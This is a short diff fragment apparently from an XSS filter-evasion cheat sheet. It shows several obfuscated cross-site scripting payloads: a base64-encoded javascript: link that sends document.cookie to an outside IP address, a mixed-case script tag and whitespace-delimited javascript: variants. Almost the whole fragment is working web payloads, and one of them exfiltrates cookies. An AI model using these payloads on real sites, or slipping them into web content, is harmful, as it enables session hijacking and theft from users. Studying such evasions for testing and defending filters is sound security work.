@@ -12,4 +12,10 @@ Base64 encoded payload: fetch('http://10.201.82.177:8000/'+encodeURIComponent(do
 
     <a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("ZmV0Y2goJ2h0dHA6Ly8xMC4yMDEuODIuMTc3OjgwMDAvJytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSk="))>Click Here</a>
 
+### 3) Mixed-Case Format
 
+    <scrIpT>aLerT(1)</scrIpT>
+
+### 4) White Space and Delimiters
+
+    <a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>
